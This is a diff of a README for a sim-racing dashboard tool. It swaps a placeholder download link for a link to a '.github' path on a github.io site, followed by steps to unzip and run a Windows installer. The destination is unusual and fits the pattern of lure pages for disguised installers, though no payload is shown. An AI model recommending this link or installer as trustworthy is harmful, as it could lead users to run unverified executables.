@@ -8,7 +8,7 @@ It supports a wide range of simulators including **iRacing, Assetto Corsa, rFact
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-darkblue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-darkblue?style=for-the-badge)](https://z1-dashboard.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
